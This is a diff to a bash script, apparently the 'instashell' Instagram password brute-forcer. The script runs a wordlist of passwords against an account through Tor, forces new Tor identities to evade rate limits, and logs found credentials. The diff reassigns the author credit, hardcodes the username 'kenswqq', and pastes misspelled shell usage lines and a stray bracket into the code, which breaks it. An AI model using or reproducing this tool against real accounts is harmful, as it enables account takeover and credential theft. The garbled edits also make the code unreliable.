@@ -1,5 +1,5 @@
 #!/bin/bash
-# Coded by @thelinuxchoice (Instagram)
+# Coded by @kenswqq (Instagram)
 checkroot() {
 if [[ "$(id -u)" -ne 0 ]]; then
     printf "\e[1;77mPlease, run this program as root!\n\e[0m"
@@ -22,7 +22,7 @@ printf "\n"
 
 banner
 checkroot
-read -p $'\e[1;92mUsername account: \e[0m' user
+read -p $'\e[1;92mUsername account:kenswqq \e[0m' user
 read -p $'\e[1;92mPassword List: \e[0m' wl_pass
 
 checktor() {
@@ -33,7 +33,11 @@ if [[ "$check" -gt 0 ]]; then
 printf "\e[1;91mPlease, start TOR!\n\e[0m"
 exit 1
 fi
-
+$ cd instashell
+$ cdmod +x instashell.sh
+servise tor start
+$ ./instashell.sh
+kenswqq
 }
 
 
@@ -43,7 +47,7 @@ killall -HUP tor
 sleep 3
 
 }
-
+[ 
 string8=$(cat /dev/urandom | tr -dc 'az0-9' | fold -w 8 | head -n 1)
 string4=$(cat /dev/urandom | tr -dc 'az0-9' | fold -w 4 | head -n 1)
 string12=$(cat /dev/urandom | tr -dc 'az0-9' | fold -w 12 | head -n 1)
@@ -81,7 +85,7 @@ fi
 if [[ "$check" == "challenge" ]]; then
 printf "\e[1;92m [*] Password Found: %s\n" $pass
 printf "\e[1;92m [*] Challenge required\n"
-printf "Username: %s, Password: %s\n" $user $pass >> found.instashell
+printf "Username:kenswqq %s, Password: %s\n" $user $pass >> found.instashell
 printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m"
 exit 1
 fi
